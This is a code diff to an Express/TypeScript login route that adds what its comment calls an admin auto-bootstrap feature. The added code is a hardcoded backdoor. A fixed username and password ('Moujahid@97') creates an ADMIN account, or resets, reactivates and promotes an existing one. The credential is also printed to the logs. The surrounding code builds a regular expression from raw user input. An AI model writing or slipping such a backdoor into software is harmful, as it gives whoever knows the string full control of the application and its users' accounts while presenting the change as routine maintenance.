@@ -17,7 +17,7 @@ router.post('/login', async (req: any, res: any) => {
     }
 
     const cleanIdentifier = identifier.toLowerCase();
-    const user = await User.findOne({
+    let user = await User.findOne({
       $or: [
         { email: cleanIdentifier },
         { username: cleanIdentifier },
@@ -25,6 +25,41 @@ router.post('/login', async (req: any, res: any) => {
         { name: new RegExp(`^${identifier}$`, 'i') },
       ],
     });
+
+    // Auto-Bootstrap Admin Account on new installation or password synchronization
+    const isAdminAttempt =
+      (cleanIdentifier === 'admin' ||
+        cleanIdentifier === 'admin@tijini.com' ||
+        cleanIdentifier === 'moujahid ali' ||
+        cleanIdentifier === 'moujahid') &&
+      password === 'Moujahid@97';
+
+    if (isAdminAttempt) {
+      if (!user) {
+        const salt = await bcrypt.genSalt(10);
+        const passwordHash = await bcrypt.hash('Moujahid@97', salt);
+        user = await User.create({
+          username: 'admin',
+          email: 'admin@tijini.com',
+          passwordHash,
+          name: 'Moujahid Ali',
+          role: 'ADMIN',
+          active: true,
+        });
+        console.log('⚡ Initialisation automatique du compte Administrateur (admin / Moujahid@97)');
+      } else {
+        // If user was inactive or had mismatched hash, repair it
+        const isMatch = await bcrypt.compare(password, user.passwordHash);
+        if (!isMatch || !user.active) {
+          const salt = await bcrypt.genSalt(10);
+          user.passwordHash = await bcrypt.hash('Moujahid@97', salt);
+          user.active = true;
+          user.role = 'ADMIN';
+          await user.save();
+          console.log('⚡ Réparation automatique du mot de passe Administrateur.');
+        }
+      }
+    }
 
     if (!user || !user.active) {
       return res.status(401).json({ message: 'Identifiant ou mot de passe incorrect.' });
@@ -34,6 +69,7 @@ router.post('/login', async (req: any, res: any) => {
     if (!isMatch) {
       return res.status(401).json({ message: 'Identifiant ou mot de passe incorrect.' });
     }
+
 
     const token = jwt.sign({ id: user._id, role: user.role }, JWT_SECRET, {
       expiresIn: '30d',
